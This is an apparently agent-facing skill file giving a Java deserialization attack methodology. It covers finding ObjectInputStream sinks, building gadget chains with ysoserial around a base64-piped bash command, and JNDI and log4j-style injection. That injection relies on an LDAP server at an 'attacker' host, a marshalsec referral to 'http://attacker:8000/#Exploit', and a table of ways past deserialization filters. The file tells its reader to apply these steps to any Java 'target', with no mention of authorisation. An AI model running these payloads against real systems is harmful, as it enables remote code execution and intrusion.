---
name: java-deserialization-methodology
description: "Java deserialization deep dive: ObjectInputStream sinks, gadget chain construction, JNDI injection, and bypassing filters. Use this skill when the target is a Java application handling serialized objects."
---

# Java Deserialization

## Overview

`ObjectInputStream.readObject()` on untrusted data is the sink. A chain of classes with dangerous `readObject`/`readResolve` gives RCE.

## Find the sink

```bash
grep -rn "readObject\|ObjectInputStream\|XMLDecoder\|readUnshared" app/
```

Entry points: HTTP body, cookies, RMI, JMX, JMS, session replication.

## Chain construction

`ysoserial` provides ready chains. Requirements: the gadget library must be on the classpath.

```bash
java -jar ysoserial.jar CommonsCollections6 "bash -c {echo,BASE64}|{base64,-d}|bash" | base64 -w0
```

| Chain | Dependency |
|---|---|
| CommonsCollections1-7 | commons-collections |
| CommonsBeanutils1 | commons-beanutils |
| Spring1/2 | spring-core |
| Groovy1 | groovy |
| Hibernate1/2 | hibernate-core |
| Jdk7u21 | JDK < 7u21 |
| JRMPClient | JDK only (needs a listener) |

## JNDI injection

The most reliable modern path when the JDK allows remote class loading (JDK < 8u191) or LDAP serialized data:

```bash
# malicious LDAP server returns a serialized gadget
java -jar JNDIExploit.jar -i attacker
# trigger: a lookup with a user-controlled name
${jndi:ldap://attacker:1389/Basic/Command/Base64/...}
```

In log4j-style sinks, the payload is `${jndi:...}` in any logged string.

## Bypassing filters

| Filter | Bypass |
|---|---|
| Blocklist of class names | use a different chain |
| `ObjectInputFilter` allowlist | find an allowed class with a gadget |
| `SerializedLambda` blocking | use `ToStringBean` variants |
| JDK 8u191+ JNDI | use a local gadget + JRMP |

## Detect the target's classpath

```bash
# error-based: send a class not present -> ClassNotFoundException names
# or read the app's lib/ directory from an LFI
```

## Marshalsec

```bash
java -cp marshalsec.jar marshalsec.jndi.LDAPRefServer "http://attacker:8000/#Exploit"
```

## Pitfalls

- Blind deserialization needs an OOB channel (DNS or a listener).
- A chain that works locally may fail remotely if a library version differs.
- Many modern frameworks disable deserialization entirely.

## Verification

An out-of-band callback or command output proves the chain executed on the target.
